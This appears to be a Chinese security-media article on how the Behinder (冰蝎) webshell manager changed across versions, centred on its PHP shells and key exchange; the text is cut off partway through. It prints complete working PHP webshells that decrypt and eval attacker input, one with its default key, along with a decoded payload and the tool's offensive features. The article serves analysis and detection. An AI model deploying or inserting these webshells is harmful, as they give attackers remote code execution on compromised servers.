---
title: 冰蝎演化史——以PHP马为例
url: https://www.4hou.com/posts/N1rN
source: 嘶吼 RoarTalk – 回归最本质的信息安全,互联网安全新媒体,4hou.com
date: 2022-11-15
fetch_date: 2025-10-03T22:43:41.582044
---

# 冰蝎演化史——以PHP马为例

冰蝎演化史——以PHP马为例 - 嘶吼 RoarTalk – 网络安全行业综合服务平台,4hou.com

[![](https://www.4hou.com/sihou/images/new4hou/newlogoss.png)](https://www.4hou.com)

* [首页](https://www.4hou.com)
* [企业中心](https://www.4hou.com/corp/newindex)
* [产业研究院](https://www.4hou.com/real-time)

![](https://www.4hou.com/sihou/images/new4hou/search-icon.png)

[投稿](https://www.4hou.com/contribute)

[登录](https://www.4hou.com/login)
  |
[注册](https://www.4hou.com/register)

* 导读 ▾
* [活动](https://www.4hou.com/newticket)
* [专题](https://www.4hou.com/category/special)
* [图谱](https://www.4hou.com/atlas/index)
* [报告](https://www.4hou.com/new-report-info)
* [嘶票](https://www.4hou.com/tickets)
* [嘶货](https://www.4hou.com/shop)
* [企业查询](https://www.4hou.com/corp/new-search-company)
* [招聘](https://www.4hou.com/recruit)![](https://www.4hou.com/sihou/images/1561626446625934.png)

* [新闻](https://www.4hou.com/category/news)
* [行业](https://www.4hou.com/category/industry)
* [趋势](https://www.4hou.com/category/observation)
* [访谈](https://www.4hou.com/category/people)
* [漏洞](https://www.4hou.com/category/vulnerable)
* [WEB安全](https://www.4hou.com/category/web)
* [业务安全](https://www.4hou.com/category/business)
* [系统安全](https://www.4hou.com/category/system)
* [内网渗透](https://www.4hou.com/category/penetration)
* [勒索软件](https://www.4hou.com/category/typ)
* [安全工具](https://www.4hou.com/category/tools)

# 冰蝎演化史——以PHP马为例

矢安科技
[行业](https://www.4hou.com/category/industry)
2022-11-14 14:55:31

![](https://img.4hou.com/article/%E6%B5%8F%E8%A7%88.png)234026

收藏

导语：简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。

冰蝎，著名的加密流量Webshell管理工具，刚好前几天冰蝎出4.0版啦，谨以此文简单回顾一下这些年冰蝎功能进化与密钥交换方面的变化。

功能是一个工具非常重要的部分，密钥交换体现了冰蝎马连接方式上的变化，小聊一下这两个比较重要的方面。

本文主要关注PHP马，因为PHP并不存在手动编译的过程，只要提供PHP源代码，PHP会自己把源代码编译为opcode，由Zend引擎来解析opcode。而冰蝎对于Java和.NET的支持都是传输加密之后的二进制字节流，java环境传输class二进制文件，.NET环境传输dll文件的二进制字节流，想要看到payload源码，还需反编译过程，稍微复杂一些。

**一：功能改进**

作为工具的使用者，最关注的还是冰蝎功能的提升。而一个基本的Webshell管理工具，以经典的菜刀为例，需要具有获取基本信息、命令执行、文件管理等基础功能，还有数据库管理、执行脚本等拓展功能。

而脍炙人口的冰蝎当然不会止步于此，从冰蝎1开始，作者根据其丰富经验，就内置了九大功能：获取基本信息、文件管理、命令执行、虚拟终端、SOCKS代理、反弹Shell、数据库可视化管理、自定义代码执行和备忘录功能。其中除了Webshell管理工具的常规功能外，针对内网环境，冰蝎1就可以做到自动上传并加载数据库驱动、反弹Meterpreter、基于一句话木马的SOCKS代理功能等强大功能。

![真正的图片1.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815253118536.png "1667814417143145.png")

从反编译的源码来看，冰蝎2时作者已有内置插件的想法，但还没完善。除此之外，冰蝎从2.0版本开始还有一些细节方面的改善，开始支持自定义请求头、自定义Cookie、HTTP代理，虚拟终端Shell进程可关闭等，从渗透角度绝对是更隐蔽了。

![图片1.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815255583300.png "1667814430804026.png")

不久后推出的冰蝎3就拥有了插件扩展，UI里可以看到支持在线安装，请求了一下发现返回是null，可能当时不同功能的插件还有待开发吧。冰蝎3能够在Github上找到的Release都是beta版，界面中所提到v3正式版上线的“平行空间”功能都没有实现。不过冰蝎3多了SOCKS代理连接、增强了内网穿透功能，在原有的基于HTTP的SOCKS5隧道基础上，增加了单端口转发功能，可一键将内网端口映射至VPS或者本机端口、请求体增加了随机冗余参数、提升了客户端运行环境的兼容性、增加内存马防检测功能、Java内存马注入功能、增加Cobalt Strike一键上线、增强Shell管理等等。

冰蝎4实现了“平行空间”功能，也就是内网资产探测和管理，本地环境简单尝试了一下，发现这个功能提升空间还是很大的。其他细节方面，冰蝎4增强了文件管理、连接逻辑重构、新增Agent内存马一键注入、多层网络子Shell穿透模块、自动缓存数据等功能。最重要的是，开放插件开发模块，可由使用者自己开发自定义插件，内置了多款插件，冰蝎生命力更进一步。

![图片3.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815255167271.png "1667814471178566.png")

**二：冰蝎1 一次GET，协商密钥**

首先分析一下冰蝎PHP马：

```
<?php
  @error_reporting(0);
session_start();
if (isset($_GET['pass']))
{
  $key=substr(md5(uniqid(rand())),16);
  $_SESSION['k']=$key;
  print $key;
}
else
{
  $key=$_SESSION['k'];
  $post=file_get_contents("php://input");
  if(!extension_loaded('openssl'))
  {
     $t="base64_"."decode";
     $post=$t($post."");
     for($i=0;$i<strlen($post);$i++) {
       $post[$i] = $post[$i]^$key[$i+1&15];
     }
 }
 else
 {
      $post=openssl_decrypt($post, "AES128", $key);
 }
 $arr=explode('|',$post);
 $func=$arr[0];
 $params=$arr[1];
 class C{public function __invoke($p) {eval($p."");}}
 @call_user_func(new C(),$params);
}
?>
```

冰蝎1新增Shell需要参数密码：

![图片4.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815256793740.png "1667815001143477.png")

这里的密码并非会话密钥，只是GET请求URL的参数。

如果收到的是GET请求，则生成随机16位密钥，并将密钥写入session，返回密钥明文。

如果收到的是POST请求，就从session中取出密钥，函数file\_get\_contents("PHP://input")获取POST请求体的内容，对其进行base64解码之后，再进行AES解密，执行解密结果：

```
assert|eval(base64_decode('QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSJlODAzYTkzYi02N2VhLTQ3ZWQtYjBiMC03NWQxNGNmOTBiZDkiOw0KbWFpbigkY29udGVudCk7'));
base64解码后：
@error_reporting(0);
function main($content)
{
    $result = array();
    $result["status"] = base64_encode("success");
   $result["msg"] = base64_encode($content);
   $key = $_SESSION['k'];
   echo encrypt(json_encode($result),$key);
}
function encrypt($data,$key)
{
   if(!extension_loaded('openssl'))
   {
     for($i=0;$i<strlen($data);$i++) {
        $data[$i] = $data[$i]^$key[$i+1&15];
        }
        return $data;
     }
    else
     {
     return openssl_encrypt($data, "AES128", $key);
     }
}$content="e803a93b-67ea-47ed-b0b0-75d14cf90bd9";
main($content);
```

冰蝎1会以一次GET请求开始本次连接，本次GET请求的响应包body就是本次会话的AES使用的密钥，本次会话使用AES/CBC/PKCS5Padding加密，IV是十六字节的0x00 。GET请求之后的第一个POST一般为请求基本信息，PHP马就是请求PHPinfo。

![图片5.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815257142904.png "1667815065208252.png")

**三：冰蝎2 多次GET，可变载荷**

冰蝎2Webshell相较于冰蝎1并没有太多改变，但在建立连接方面，冰蝎2会以至少两次GET请求开启一次与Webshell的连接。通过比较前后两次请求包body的内容确定前后附加的内容：

```
11111payload22222
11111another payload22222
```

本次连接的会话密钥以最后一个GET请求的相应包body为准。两次GET显然提升了冰蝎马的灵活性。

建立连接时GET请求之后，还有一次POST请求，用于验证密钥，以下是该POST请求携带payload所执行的函数：

```
@error_reporting(0);
function main($content)
{
    $result = array();
    $result["status"] = base64_encode("success");
   $result["msg"] = base64_encode($content);
   $key = $_SESSION['k'];
   echo encrypt(json_encode($result),$key);
}
function encrypt($data,$key)
{
  if(!extension_loaded('openssl'))
     {
        for($i=0;$i<strlen($data);$i++) {
          $data[$i] = $data[$i]^$key[$i+1&15];
          }
          return $data;
     }
    else
     {
     return openssl_encrypt($data, "AES128", $key);
     }
}$content="f61e7813-2848-4fe0-b658-d24f5c019f03";
main($content);
```

可以看到这里协商密钥的依据是content，找源码发现是随机生成的uuid，长度固定，或许可以作为一种检测特征。如果服务端能够正确解码content，这证明双方持有的密钥一致，可以开始通信了。

**四：冰蝎3 预共享密钥，无明文交互**

首先，什么叫做预共享密钥？所谓预共享，即在未连接时已完成密钥共享，冰蝎3新增Shell设置有参数密码。默认密钥是作者的id的MD5值，而AES密钥一般为128bit，16字节，于是取key值的MD5前十六位作为密钥。开始连接时，客户端会发起一个POST请求，发送使用key的MD5前十六位加密密文的Base64编码，若服务端能够正确解码，那么证明本次密钥协商成功。

![图片6.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815258115219.png "1667815119107368.png")

以下是冰蝎3的默认PHP木马：

```
<?php
@error_reporting(0);
session_start();
    $key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
  $_SESSION['k']=$key;
  session_write_close();
  $post=file_get_contents("php://input");
  if(!extension_loaded('openssl'))
  {
    $t="base64_"."decode";
    $post=$t($post."");
    for($i=0;$i<strlen($post);$i++) {
      $post[$i] = $post[$i]^$key[$i+1&15];
       }
  }
  else
  {
      $post=openssl_decrypt($post, "AES128", $key);
  }
    $arr=explode('|',$post);
    $func=$arr[0];
    $params=$arr[1];
      class C{public function __invoke($p) {eval($p."");}}
    @call_user_func(new C(),$params);
?>
```

其基本功能就是解密payload，执行其携带的函数，做了一定的免杀处理。本段更关注其加解密部分，参数key就是新建Shell时参数密码值MD5的前16位，刚好128bit。这个值当然也可以修改，改成别的字符串，PHP马的参数key也需要更改成该字符串的MD5值前16位。

协商密钥的GET请求包是冰蝎1、2的重要特征，冰蝎3采用预共享密钥，规避了密钥的明文传输，使流量更加隐蔽，在当时是对各家WAF的一个全新考验。

![图片7.png](https://img.4hou.com/uploads/ueditor/php/upload/image/20221107/1667815259115579.png ...